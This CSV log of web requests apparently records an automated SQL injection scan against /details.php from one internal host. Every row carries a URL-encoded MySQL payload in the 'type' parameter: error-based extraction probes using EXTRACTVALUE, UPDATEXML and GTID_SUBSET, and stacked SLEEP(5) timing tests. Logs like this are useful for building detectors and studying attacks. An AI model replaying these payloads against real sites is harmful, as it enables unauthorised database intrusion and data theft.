full_url,event_time,hostname
/details.php?prod=5&type=-5530%27%20WHERE%203742%3D3742%20OR%201%20GROUP%20BY%20CONCAT%280x7176787171%2C%28SELECT%20%28CASE%20WHEN%20%281139%3D1139%29%20THEN%201%20ELSE%200%20END%29%29%2C0x7178706a71%2CFLOOR%28RAND%280%29%2A2%29%29%20HAVING%20MIN%280%29%23,1680093132.793472,10.0.2.31
/details.php?prod=5&type=-9156%22%20WHERE%202339%3D2339%20OR%201%20GROUP%20BY%20CONCAT%280x7176787171%2C%28SELECT%20%28CASE%20WHEN%20%281139%3D1139%29%20THEN%201%20ELSE%200%20END%29%29%2C0x7178706a71%2CFLOOR%28RAND%280%29%2A2%29%29%20HAVING%20MIN%280%29%23,1680093132.797249,10.0.2.31
/details.php?prod=5&type=-8714%27%29%29%20AS%20UmXP%20WHERE%203274%3D3274%20OR%201%20GROUP%20BY%20CONCAT%280x7176787171%2C%28SELECT%20%28CASE%20WHEN%20%281139%3D1139%29%20THEN%201%20ELSE%200%20END%29%29%2C0x7178706a71%2CFLOOR%28RAND%280%29%2A2%29%29%20HAVING%20MIN%280%29%23,1680093132.801535,10.0.2.31
/details.php?prod=5&type=-2100%22%29%29%20AS%20ngjD%20WHERE%205468%3D5468%20OR%201%20GROUP%20BY%20CONCAT%280x7176787171%2C%28SELECT%20%28CASE%20WHEN%20%281139%3D1139%29%20THEN%201%20ELSE%200%20END%29%29%2C0x7178706a71%2CFLOOR%28RAND%280%29%2A2%29%29%20HAVING%20MIN%280%29%23,1680093132.805055,10.0.2.31
/details.php?prod=5&type=-4460%27%29%20AS%20KXxC%20WHERE%206855%3D6855%20OR%201%20GROUP%20BY%20CONCAT%280x7176787171%2C%28SELECT%20%28CASE%20WHEN%20%281139%3D1139%29%20THEN%201%20ELSE%200%20END%29%29%2C0x7178706a71%2CFLOOR%28RAND%280%29%2A2%29%29%20HAVING%20MIN%280%29%23,1680093132.808807,10.0.2.31
/details.php?prod=5&type=-1980%22%29%20AS%20JDJc%20WHERE%205583%3D5583%20OR%201%20GROUP%20BY%20CONCAT%280x7176787171%2C%28SELECT%20%28CASE%20WHEN%20%281139%3D1139%29%20THEN%201%20ELSE%200%20END%29%29%2C0x7178706a71%2CFLOOR%28RAND%280%29%2A2%29%29%20HAVING%20MIN%280%29%23,1680093132.812344,10.0.2.31
/details.php?prod=5&type=2%29%20PROCEDURE%20ANALYSE%28EXTRACTVALUE%283763%2CCONCAT%280x5c%2C0x7176787171%2C%28SELECT%20%28CASE%20WHEN%20%283763%3D3763%29%20THEN%201%20ELSE%200%20END%29%29%2C0x7178706a71%29%29%2C1%29--%20rvlT,1680093132.816357,10.0.2.31
/details.php?prod=5&type=2%29%20PROCEDURE%20ANALYSE%28EXTRACTVALUE%283763%2CCONCAT%280x5c%2C0x7176787171%2C%28SELECT%20%28CASE%20WHEN%20%283763%3D3763%29%20THEN%201%20ELSE%200%20END%29%29%2C0x7178706a71%29%29%2C1%29%20AND%20%282017%3D2017,1680093132.820143,10.0.2.31
/details.php?prod=5&type=2%29%29%20PROCEDURE%20ANALYSE%28EXTRACTVALUE%283763%2CCONCAT%280x5c%2C0x7176787171%2C%28SELECT%20%28CASE%20WHEN%20%283763%3D3763%29%20THEN%201%20ELSE%200%20END%29%29%2C0x7178706a71%29%29%2C1%29%20AND%20%28%282519%3D2519,1680093132.824156,10.0.2.31
/details.php?prod=5&type=2%29%29%29%20PROCEDURE%20ANALYSE%28EXTRACTVALUE%283763%2CCONCAT%280x5c%2C0x7176787171%2C%28SELECT%20%28CASE%20WHEN%20%283763%3D3763%29%20THEN%201%20ELSE%200%20END%29%29%2C0x7178706a71%29%29%2C1%29%20AND%20%28%28%289144%3D9144,1680093132.828957,10.0.2.31
/details.php?prod=5&type=2%20PROCEDURE%20ANALYSE%28EXTRACTVALUE%283763%2CCONCAT%280x5c%2C0x7176787171%2C%28SELECT%20%28CASE%20WHEN%20%283763%3D3763%29%20THEN%201%20ELSE%200%20END%29%29%2C0x7178706a71%29%29%2C1%29,1680093132.833829,10.0.2.31
/details.php?prod=5&type=2%20PROCEDURE%20ANALYSE%28EXTRACTVALUE%283763%2CCONCAT%280x5c%2C0x7176787171%2C%28SELECT%20%28CASE%20WHEN%20%283763%3D3763%29%20THEN%201%20ELSE%200%20END%29%29%2C0x7178706a71%29%29%2C1%29--%20PkuT,1680093132.837636,10.0.2.31
/details.php?prod=5&type=2%20PROCEDURE%20ANALYSE%28EXTRACTVALUE%283763%2CCONCAT%280x5c%2C0x7176787171%2C%28SELECT%20%28CASE%20WHEN%20%283763%3D3763%29%20THEN%201%20ELSE%200%20END%29%29%2C0x7178706a71%29%29%2C1%29%23%20sAqV,1680093132.843241,10.0.2.31
/details.php?prod=5&type=2%29%29%20AS%20mmeB%20WHERE%209985%3D9985%20PROCEDURE%20ANALYSE%28EXTRACTVALUE%283763%2CCONCAT%280x5c%2C0x7176787171%2C%28SELECT%20%28CASE%20WHEN%20%283763%3D3763%29%20THEN%201%20ELSE%200%20END%29%29%2C0x7178706a71%29%29%2C1%29--%20PmtT,1680093132.856949,10.0.2.31
/details.php?prod=5&type=2%29%20AS%20Lyss%20WHERE%202771%3D2771%20PROCEDURE%20ANALYSE%28EXTRACTVALUE%283763%2CCONCAT%280x5c%2C0x7176787171%2C%28SELECT%20%28CASE%20WHEN%20%283763%3D3763%29%20THEN%201%20ELSE%200%20END%29%29%2C0x7178706a71%29%29%2C1%29--%20FeCs,1680093132.861778,10.0.2.31
/details.php?prod=5&type=2%60%20WHERE%206541%3D6541%20PROCEDURE%20ANALYSE%28EXTRACTVALUE%283763%2CCONCAT%280x5c%2C0x7176787171%2C%28SELECT%20%28CASE%20WHEN%20%283763%3D3763%29%20THEN%201%20ELSE%200%20END%29%29%2C0x7178706a71%29%29%2C1%29--%20Jfbn,1680093132.867078,10.0.2.31
/details.php?prod=5&type=2%60%29%20WHERE%204152%3D4152%20PROCEDURE%20ANALYSE%28EXTRACTVALUE%283763%2CCONCAT%280x5c%2C0x7176787171%2C%28SELECT%20%28CASE%20WHEN%20%283763%3D3763%29%20THEN%201%20ELSE%200%20END%29%29%2C0x7178706a71%29%29%2C1%29--%20vvup,1680093132.871026,10.0.2.31
/details.php?prod=5&type=2%27%29%20PROCEDURE%20ANALYSE%28EXTRACTVALUE%283763%2CCONCAT%280x5c%2C0x7176787171%2C%28SELECT%20%28CASE%20WHEN%20%283763%3D3763%29%20THEN%201%20ELSE%200%20END%29%29%2C0x7178706a71%29%29%2C1%29--%20uqnO,1680093132.875789,10.0.2.31
/details.php?prod=5&type=2%27%20PROCEDURE%20ANALYSE%28EXTRACTVALUE%283763%2CCONCAT%280x5c%2C0x7176787171%2C%28SELECT%20%28CASE%20WHEN%20%283763%3D3763%29%20THEN%201%20ELSE%200%20END%29%29%2C0x7178706a71%29%29%2C1%29--%20HpvB,1680093132.879399,10.0.2.31
/details.php?prod=5&type=2%22%20PROCEDURE%20ANALYSE%28EXTRACTVALUE%283763%2CCONCAT%280x5c%2C0x7176787171%2C%28SELECT%20%28CASE%20WHEN%20%283763%3D3763%29%20THEN%201%20ELSE%200%20END%29%29%2C0x7178706a71%29%29%2C1%29--%20UZbn,1680093132.886832,10.0.2.31
/details.php?prod=5&type=2%27%29%20PROCEDURE%20ANALYSE%28EXTRACTVALUE%283763%2CCONCAT%280x5c%2C0x7176787171%2C%28SELECT%20%28CASE%20WHEN%20%283763%3D3763%29%20THEN%201%20ELSE%200%20END%29%29%2C0x7178706a71%29%29%2C1%29%20AND%20%28%27jYpl%27%3D%27jYpl,1680093132.891544,10.0.2.31
/details.php?prod=5&type=2%27%29%29%20PROCEDURE%20ANALYSE%28EXTRACTVALUE%283763%2CCONCAT%280x5c%2C0x7176787171%2C%28SELECT%20%28CASE%20WHEN%20%283763%3D3763%29%20THEN%201%20ELSE%200%20END%29%29%2C0x7178706a71%29%29%2C1%29%20AND%20%28%28%27yjWn%27%3D%27yjWn,1680093132.895118,10.0.2.31
/details.php?prod=5&type=2%27%29%29%29%20PROCEDURE%20ANALYSE%28EXTRACTVALUE%283763%2CCONCAT%280x5c%2C0x7176787171%2C%28SELECT%20%28CASE%20WHEN%20%283763%3D3763%29%20THEN%201%20ELSE%200%20END%29%29%2C0x7178706a71%29%29%2C1%29%20AND%20%28%28%28%27FBbm%27%3D%27FBbm,1680093132.89962,10.0.2.31
/details.php?prod=5&type=2%27%20PROCEDURE%20ANALYSE%28EXTRACTVALUE%283763%2CCONCAT%280x5c%2C0x7176787171%2C%28SELECT%20%28CASE%20WHEN%20%283763%3D3763%29%20THEN%201%20ELSE%200%20END%29%29%2C0x7178706a71%29%29%2C1%29%20AND%20%27czVy%27%3D%27czVy,1680093132.90334,10.0.2.31
/details.php?prod=5&type=2%27%29%20PROCEDURE%20ANALYSE%28EXTRACTVALUE%283763%2CCONCAT%280x5c%2C0x7176787171%2C%28SELECT%20%28CASE%20WHEN%20%283763%3D3763%29%20THEN%201%20ELSE%200%20END%29%29%2C0x7178706a71%29%29%2C1%29%20AND%20%28%27GTdi%27%20LIKE%20%27GTdi,1680093132.907053,10.0.2.31
/details.php?prod=5&type=2%27%29%29%20PROCEDURE%20ANALYSE%28EXTRACTVALUE%283763%2CCONCAT%280x5c%2C0x7176787171%2C%28SELECT%20%28CASE%20WHEN%20%283763%3D3763%29%20THEN%201%20ELSE%200%20END%29%29%2C0x7178706a71%29%29%2C1%29%20AND%20%28%28%27oVln%27%20LIKE%20%27oVln,1680093132.910453,10.0.2.31
/details.php?prod=5&type=2%27%29%29%29%20PROCEDURE%20ANALYSE%28EXTRACTVALUE%283763%2CCONCAT%280x5c%2C0x7176787171%2C%28SELECT%20%28CASE%20WHEN%20%283763%3D3763%29%20THEN%201%20ELSE%200%20END%29%29%2C0x7178706a71%29%29%2C1%29%20AND%20%28%28%28%27BqYg%27%20LIKE%20%27BqYg,1680093132.913985,10.0.2.31
/details.php?prod=5&type=2%25%27%20PROCEDURE%20ANALYSE%28EXTRACTVALUE%283763%2CCONCAT%280x5c%2C0x7176787171%2C%28SELECT%20%28CASE%20WHEN%20%283763%3D3763%29%20THEN%201%20ELSE%200%20END%29%29%2C0x7178706a71%29%29%2C1%29%20AND%20%27BZTY%25%27%3D%27BZTY,1680093132.918212,10.0.2.31
/details.php?prod=5&type=2%27%20PROCEDURE%20ANALYSE%28EXTRACTVALUE%283763%2CCONCAT%280x5c%2C0x7176787171%2C%28SELECT%20%28CASE%20WHEN%20%283763%3D3763%29%20THEN%201%20ELSE%200%20END%29%29%2C0x7178706a71%29%29%2C1%29%20AND%20%27PGUZ%27%20LIKE%20%27PGUZ,1680093132.921957,10.0.2.31
/details.php?prod=5&type=2%22%29%20PROCEDURE%20ANALYSE%28EXTRACTVALUE%283763%2CCONCAT%280x5c%2C0x7176787171%2C%28SELECT%20%28CASE%20WHEN%20%283763%3D3763%29%20THEN%201%20ELSE%200%20END%29%29%2C0x7178706a71%29%29%2C1%29%20AND%20%28%22rVKW%22%3D%22rVKW,1680093132.925606,10.0.2.31
/details.php?prod=5&type=2%22%29%29%20PROCEDURE%20ANALYSE%28EXTRACTVALUE%283763%2CCONCAT%280x5c%2C0x7176787171%2C%28SELECT%20%28CASE%20WHEN%20%283763%3D3763%29%20THEN%201%20ELSE%200%20END%29%29%2C0x7178706a71%29%29%2C1%29%20AND%20%28%28%22DYXK%22%3D%22DYXK,1680093132.929379,10.0.2.31
/details.php?prod=5&type=2%22%29%29%29%20PROCEDURE%20ANALYSE%28EXTRACTVALUE%283763%2CCONCAT%280x5c%2C0x7176787171%2C%28SELECT%20%28CASE%20WHEN%20%283763%3D3763%29%20THEN%201%20ELSE%200%20END%29%29%2C0x7178706a71%29%29%2C1%29%20AND%20%28%28%28%22kXxL%22%3D%22kXxL,1680093132.933112,10.0.2.31
/details.php?prod=5&type=2%22%20PROCEDURE%20ANALYSE%28EXTRACTVALUE%283763%2CCONCAT%280x5c%2C0x7176787171%2C%28SELECT%20%28CASE%20WHEN%20%283763%3D3763%29%20THEN%201%20ELSE%200%20END%29%29%2C0x7178706a71%29%29%2C1%29%20AND%20%22dUId%22%3D%22dUId,1680093132.936591,10.0.2.31
/details.php?prod=5&type=2%22%29%20PROCEDURE%20ANALYSE%28EXTRACTVALUE%283763%2CCONCAT%280x5c%2C0x7176787171%2C%28SELECT%20%28CASE%20WHEN%20%283763%3D3763%29%20THEN%201%20ELSE%200%20END%29%29%2C0x7178706a71%29%29%2C1%29%20AND%20%28%22IAMz%22%20LIKE%20%22IAMz,1680093132.940384,10.0.2.31
/details.php?prod=5&type=2%22%29%29%20PROCEDURE%20ANALYSE%28EXTRACTVALUE%283763%2CCONCAT%280x5c%2C0x7176787171%2C%28SELECT%20%28CASE%20WHEN%20%283763%3D3763%29%20THEN%201%20ELSE%200%20END%29%29%2C0x7178706a71%29%29%2C1%29%20AND%20%28%28%22PJCM%22%20LIKE%20%22PJCM,1680093132.943939,10.0.2.31
/details.php?prod=5&type=2%22%29%29%29%20PROCEDURE%20ANALYSE%28EXTRACTVALUE%283763%2CCONCAT%280x5c%2C0x7176787171%2C%28SELECT%20%28CASE%20WHEN%20%283763%3D3763%29%20THEN%201%20ELSE%200%20END%29%29%2C0x7178706a71%29%29%2C1%29%20AND%20%28%28%28%22TRjK%22%20LIKE%20%22TRjK,1680093132.947552,10.0.2.31
/details.php?prod=5&type=2%22%20PROCEDURE%20ANALYSE%28EXTRACTVALUE%283763%2CCONCAT%280x5c%2C0x7176787171%2C%28SELECT%20%28CASE%20WHEN%20%283763%3D3763%29%20THEN%201%20ELSE%200%20END%29%29%2C0x7178706a71%29%29%2C1%29%20AND%20%22YvXD%22%20LIKE%20%22YvXD,1680093132.951535,10.0.2.31
/details.php?prod=5&type=2%27%20PROCEDURE%20ANALYSE%28EXTRACTVALUE%283763%2CCONCAT%280x5c%2C0x7176787171%2C%28SELECT%20%28CASE%20WHEN%20%283763%3D3763%29%20THEN%201%20ELSE%200%20END%29%29%2C0x7178706a71%29%29%2C1%29%20OR%20%27GFjq%27%3D%27ZgwF,1680093132.955248,10.0.2.31
/details.php?prod=5&type=2%27%29%29%20AS%20ocHw%20WHERE%205589%3D5589%20PROCEDURE%20ANALYSE%28EXTRACTVALUE%283763%2CCONCAT%280x5c%2C0x7176787171%2C%28SELECT%20%28CASE%20WHEN%20%283763%3D3763%29%20THEN%201%20ELSE%200%20END%29%29%2C0x7178706a71%29%29%2C1%29--%20kxnZ,1680093132.959274,10.0.2.31
/details.php?prod=5&type=2%22%29%29%20AS%20JTjL%20WHERE%202555%3D2555%20PROCEDURE%20ANALYSE%28EXTRACTVALUE%283763%2CCONCAT%280x5c%2C0x7176787171%2C%28SELECT%20%28CASE%20WHEN%20%283763%3D3763%29%20THEN%201%20ELSE%200%20END%29%29%2C0x7178706a71%29%29%2C1%29--%20PDQp,1680093132.962581,10.0.2.31
/details.php?prod=5&type=2%27%29%20AS%20mzNr%20WHERE%204952%3D4952%20PROCEDURE%20ANALYSE%28EXTRACTVALUE%283763%2CCONCAT%280x5c%2C0x7176787171%2C%28SELECT%20%28CASE%20WHEN%20%283763%3D3763%29%20THEN%201%20ELSE%200%20END%29%29%2C0x7178706a71%29%29%2C1%29--%20nogt,1680093132.966771,10.0.2.31
/details.php?prod=5&type=2%22%29%20AS%20pfyf%20WHERE%205623%3D5623%20PROCEDURE%20ANALYSE%28EXTRACTVALUE%283763%2CCONCAT%280x5c%2C0x7176787171%2C%28SELECT%20%28CASE%20WHEN%20%283763%3D3763%29%20THEN%201%20ELSE%200%20END%29%29%2C0x7178706a71%29%29%2C1%29--%20QrKY,1680093132.970548,10.0.2.31
/details.php?prod=5&type=2%27%20IN%20BOOLEAN%20MODE%29%20PROCEDURE%20ANALYSE%28EXTRACTVALUE%283763%2CCONCAT%280x5c%2C0x7176787171%2C%28SELECT%20%28CASE%20WHEN%20%283763%3D3763%29%20THEN%201%20ELSE%200%20END%29%29%2C0x7178706a71%29%29%2C1%29%23,1680093132.974358,10.0.2.31
/details.php?prod=5&type=%28SELECT%202%2A%28IF%28%28SELECT%20%2A%20FROM%20%28SELECT%20CONCAT%280x7176787171%2C%28SELECT%20%28ELT%284162%3D4162%2C1%29%29%29%2C0x7178706a71%2C0x78%29%29s%29%2C%208446744073709551610%2C%208446744073709551610%29%29%29,1680093132.97851,10.0.2.31
/details.php?prod=5&type=EXP%28~%28SELECT%20%2A%20FROM%20%28SELECT%20CONCAT%280x7176787171%2C%28SELECT%20%28ELT%281467%3D1467%2C1%29%29%29%2C0x7178706a71%2C0x78%29%29x%29%29,1680093132.98368,10.0.2.31
/details.php?prod=5&type=GTID_SUBSET%28CONCAT%280x7176787171%2C%28SELECT%20%28ELT%282928%3D2928%2C1%29%29%29%2C0x7178706a71%29%2C2928%29,1680093132.98763,10.0.2.31
/details.php?prod=5&type=JSON_KEYS%28%28SELECT%20CONVERT%28%28SELECT%20CONCAT%280x7176787171%2C%28SELECT%20%28ELT%288050%3D8050%2C1%29%29%29%2C0x7178706a71%29%29%20USING%20utf8%29%29%29,1680093132.994591,10.0.2.31
/details.php?prod=5&type=%28SELECT%201712%20FROM%28SELECT%20COUNT%28%2A%29%2CCONCAT%280x7176787171%2C%28SELECT%20%28ELT%281712%3D1712%2C1%29%29%29%2C0x7178706a71%2CFLOOR%28RAND%280%29%2A2%29%29x%20FROM%20INFORMATION_SCHEMA.PLUGINS%20GROUP%20BY%20x%29a%29,1680093132.99949,10.0.2.31
/details.php?prod=5&type=%28UPDATEXML%283763%2CCONCAT%280x2e%2C0x7176787171%2C%28SELECT%20%28ELT%283763%3D3763%2C1%29%29%29%2C0x7178706a71%29%2C4093%29%29,1680093133.004998,10.0.2.31
/details.php?prod=5&type=%28EXTRACTVALUE%287077%2CCONCAT%280x5c%2C0x7176787171%2C%28SELECT%20%28ELT%287077%3D7077%2C1%29%29%29%2C0x7178706a71%29%29%29,1680093133.01168,10.0.2.31
/details.php?prod=5&type=2%2C%28SELECT%202197%20FROM%20%28SELECT%202%2A%28IF%28%28SELECT%20%2A%20FROM%20%28SELECT%20CONCAT%280x7176787171%2C%28SELECT%20%28ELT%282197%3D2197%2C1%29%29%29%2C0x7178706a71%2C0x78%29%29s%29%2C%208446744073709551610%2C%208446744073709551610%29%29%29x%29,1680093133.024349,10.0.2.31
/details.php?prod=5&type=2%27%2C%28SELECT%202197%20FROM%20%28SELECT%202%2A%28IF%28%28SELECT%20%2A%20FROM%20%28SELECT%20CONCAT%280x7176787171%2C%28SELECT%20%28ELT%282197%3D2197%2C1%29%29%29%2C0x7178706a71%2C0x78%29%29s%29%2C%208446744073709551610%2C%208446744073709551610%29%29%29x%29--%20CjNg,1680093133.029436,10.0.2.31
/details.php?prod=5&type=2%2C%28SELECT%201715%20FROM%20%28SELECT%20EXP%28~%28SELECT%20%2A%20FROM%20%28SELECT%20CONCAT%280x7176787171%2C%28SELECT%20%28ELT%281715%3D1715%2C1%29%29%29%2C0x7178706a71%2C0x78%29%29x%29%29%29s%29,1680093133.035017,10.0.2.31
/details.php?prod=5&type=2%27%2C%28SELECT%201715%20FROM%20%28SELECT%20EXP%28~%28SELECT%20%2A%20FROM%20%28SELECT%20CONCAT%280x7176787171%2C%28SELECT%20%28ELT%281715%3D1715%2C1%29%29%29%2C0x7178706a71%2C0x78%29%29x%29%29%29s%29--%20sniV,1680093133.039447,10.0.2.31
/details.php?prod=5&type=2%2CGTID_SUBSET%28CONCAT%280x7176787171%2C%28SELECT%20%28ELT%284043%3D4043%2C1%29%29%29%2C0x7178706a71%29%2C4043%29,1680093133.045269,10.0.2.31
/details.php?prod=5&type=2%27%2CGTID_SUBSET%28CONCAT%280x7176787171%2C%28SELECT%20%28ELT%284043%3D4043%2C1%29%29%29%2C0x7178706a71%29%2C4043%29--%20uCGr,1680093133.056558,10.0.2.31
/details.php?prod=5&type=2%2C%28SELECT%206954%20FROM%20%28SELECT%20JSON_KEYS%28%28SELECT%20CONVERT%28%28SELECT%20CONCAT%280x7176787171%2C%28SELECT%20%28ELT%286954%3D6954%2C1%29%29%29%2C0x7178706a71%29%29%20USING%20utf8%29%29%29%29x%29,1680093133.073157,10.0.2.31
/details.php?prod=5&type=2%27%2C%28SELECT%206954%20FROM%20%28SELECT%20JSON_KEYS%28%28SELECT%20CONVERT%28%28SELECT%20CONCAT%280x7176787171%2C%28SELECT%20%28ELT%286954%3D6954%2C1%29%29%29%2C0x7178706a71%29%29%20USING%20utf8%29%29%29%29x%29--%20ufTu,1680093133.077941,10.0.2.31
/details.php?prod=5&type=2%2C%28SELECT%206723%20FROM%28SELECT%20COUNT%28%2A%29%2CCONCAT%280x7176787171%2C%28SELECT%20%28ELT%286723%3D6723%2C1%29%29%29%2C0x7178706a71%2CFLOOR%28RAND%280%29%2A2%29%29x%20FROM%20INFORMATION_SCHEMA.PLUGINS%20GROUP%20BY%20x%29a%29,1680093133.092477,10.0.2.31
/details.php?prod=5&type=2%27%2C%28SELECT%206723%20FROM%28SELECT%20COUNT%28%2A%29%2CCONCAT%280x7176787171%2C%28SELECT%20%28ELT%286723%3D6723%2C1%29%29%29%2C0x7178706a71%2CFLOOR%28RAND%280%29%2A2%29%29x%20FROM%20INFORMATION_SCHEMA.PLUGINS%20GROUP%20BY%20x%29a%29--%20fxzs,1680093133.098011,10.0.2.31
/details.php?prod=5&type=2%2CEXTRACTVALUE%287424%2CCONCAT%280x5c%2C0x7176787171%2C%28SELECT%20%28ELT%287424%3D7424%2C1%29%29%29%2C0x7178706a71%29%29,1680093133.104194,10.0.2.31
/details.php?prod=5&type=2%27%2CEXTRACTVALUE%287424%2CCONCAT%280x5c%2C0x7176787171%2C%28SELECT%20%28ELT%287424%3D7424%2C1%29%29%29%2C0x7178706a71%29%29--%20WKep,1680093133.108778,10.0.2.31
/details.php?prod=5&type=2%2CUPDATEXML%286315%2CCONCAT%280x2e%2C0x7176787171%2C%28SELECT%20%28ELT%286315%3D6315%2C1%29%29%29%2C0x7178706a71%29%2C5605%29,1680093133.122883,10.0.2.31
/details.php?prod=5&type=2%27%2CUPDATEXML%286315%2CCONCAT%280x2e%2C0x7176787171%2C%28SELECT%20%28ELT%286315%3D6315%2C1%29%29%29%2C0x7178706a71%29%2C5605%29--%20snzY,1680093133.132961,10.0.2.31
/details.php?prod=5&type=2%2C%28SELECT%206392%20FROM%20%28SELECT%20ROW%286392%2C1379%29%3E%28SELECT%20COUNT%28%2A%29%2CCONCAT%280x7176787171%2C%28SELECT%20%28ELT%286392%3D6392%2C1%29%29%29%2C0x7178706a71%2CFLOOR%28RAND%280%29%2A2%29%29x%20FROM%20%28SELECT%201216%20UNION%20SELECT%209392%20UNION%20SELECT%202083%20UNION%20SELECT%207202%29a%20GROUP%20BY%20x%29%29s%29,1680093133.146612,10.0.2.31
/details.php?prod=5&type=2%27%2C%28SELECT%206392%20FROM%20%28SELECT%20ROW%286392%2C1379%29%3E%28SELECT%20COUNT%28%2A%29%2CCONCAT%280x7176787171%2C%28SELECT%20%28ELT%286392%3D6392%2C1%29%29%29%2C0x7178706a71%2CFLOOR%28RAND%280%29%2A2%29%29x%20FROM%20%28SELECT%201216%20UNION%20SELECT%209392%20UNION%20SELECT%202083%20UNION%20SELECT%207202%29a%20GROUP%20BY%20x%29%29s%29--%20MjNC,1680093133.154845,10.0.2.31
/details.php?prod=5&type=%28SELECT%20CONCAT%280x7176787171%2C%28ELT%286536%3D6536%2C1%29%29%2C0x7178706a71%29%29,1680093133.163352,10.0.2.31
/details.php?prod=5&type=2%29%3BSELECT%20SLEEP%285%29%23,1680093133.170759,10.0.2.31
/details.php?prod=5&type=2%29%29%3BSELECT%20SLEEP%285%29%23,1680093133.174862,10.0.2.31
/details.php?prod=5&type=2%29%29%29%3BSELECT%20SLEEP%285%29%23,1680093133.179212,10.0.2.31
/details.php?prod=5&type=2%3BSELECT%20SLEEP%285%29%23,1680093133.184844,10.0.2.31
/details.php?prod=5&type=2%29%29%20AS%20FzJR%20WHERE%202413%3D2413%3BSELECT%20SLEEP%285%29%23,1680093133.200014,10.0.2.31
/details.php?prod=5&type=2%29%20AS%20xfbn%20WHERE%208486%3D8486%3BSELECT%20SLEEP%285%29%23,1680093133.204012,10.0.2.31
/details.php?prod=5&type=2%60%20WHERE%206399%3D6399%3BSELECT%20SLEEP%285%29%23,1680093133.207864,10.0.2.31
/details.php?prod=5&type=2%60%29%20WHERE%201979%3D1979%3BSELECT%20SLEEP%285%29%23,1680093133.211719,10.0.2.31
/details.php?prod=5&type=2%60%3D%602%60%3BSELECT%20SLEEP%285%29%23,1680093133.216216,10.0.2.31
/details.php?prod=5&type=2%5D-%28SELECT%200%20WHERE%205275%3D5275%3BSELECT%20SLEEP%285%29%23,1680093133.220138,10.0.2.31
/details.php?prod=5&type=2%27%29%3BSELECT%20SLEEP%285%29%23,1680093133.224079,10.0.2.31
/details.php?prod=5&type=2%27%3BSELECT%20SLEEP%285%29%23,1680093133.227039,10.0.2.31
/details.php?prod=5&type=2%22%3BSELECT%20SLEEP%285%29%23,1680093133.230535,10.0.2.31
/details.php?prod=5&type=2%27%29%29%3BSELECT%20SLEEP%285%29%23,1680093133.23526,10.0.2.31
/details.php?prod=5&type=2%27%29%29%29%3BSELECT%20SLEEP%285%29%23,1680093133.238456,10.0.2.31
/details.php?prod=5&type=2%25%27%3BSELECT%20SLEEP%285%29%23,1680093133.242267,10.0.2.31
/details.php?prod=5&type=2%22%29%3BSELECT%20SLEEP%285%29%23,1680093133.247129,10.0.2.31
/details.php?prod=5&type=2%22%29%29%3BSELECT%20SLEEP%285%29%23,1680093133.251709,10.0.2.31
/details.php?prod=5&type=2%22%29%29%29%3BSELECT%20SLEEP%285%29%23,1680093133.256093,10.0.2.31
/details.php?prod=5&type=2%27%29%29%20AS%20GiCg%20WHERE%203037%3D3037%3BSELECT%20SLEEP%285%29%23,1680093133.263223,10.0.2.31
/details.php?prod=5&type=2%22%29%29%20AS%20aaZi%20WHERE%203971%3D3971%3BSELECT%20SLEEP%285%29%23,1680093133.268354,10.0.2.31
/details.php?prod=5&type=2%27%29%20AS%20fGIe%20WHERE%206563%3D6563%3BSELECT%20SLEEP%285%29%23,1680093133.272917,10.0.2.31
/details.php?prod=5&type=2%22%29%20AS%20zLVi%20WHERE%208315%3D8315%3BSELECT%20SLEEP%285%29%23,1680093133.277689,10.0.2.31
/details.php?prod=5&type=2%22%3D%222%22%3BSELECT%20SLEEP%285%29%23,1680093133.281552,10.0.2.31
/details.php?prod=5&type=2%27%20IN%20BOOLEAN%20MODE%29%3BSELECT%20SLEEP%285%29%23,1680093133.285743,10.0.2.31
/details.php?prod=5&type=2%29%3BSELECT%20SLEEP%285%29--%20gqia,1680093133.290015,10.0.2.31
/details.php?prod=5&type=2%29%3BSELECT%20SLEEP%285%29%20AND%20%285111%3D5111,1680093133.293608,10.0.2.31
/details.php?prod=5&type=2%29%29%3BSELECT%20SLEEP%285%29%20AND%20%28%281540%3D1540,1680093133.297978,10.0.2.31
/details.php?prod=5&type=2%29%29%29%3BSELECT%20SLEEP%285%29%20AND%20%28%28%286852%3D6852,1680093133.302075,10.0.2.31
/details.php?prod=5&type=2%3BSELECT%20SLEEP%285%29,1680093133.305953,10.0.2.31
/details.php?prod=5&type=2%3BSELECT%20SLEEP%285%29--%20CjmR,1680093133.31019,10.0.2.31
/details.php?prod=5&type=2%3BSELECT%20SLEEP%285%29%23%20NEGr,1680093133.314447,10.0.2.31
/details.php?prod=5&type=2%29%29%20AS%20IGgK%20WHERE%202607%3D2607%3BSELECT%20SLEEP%285%29--%20lTzo,1680093133.319742,10.0.2.31
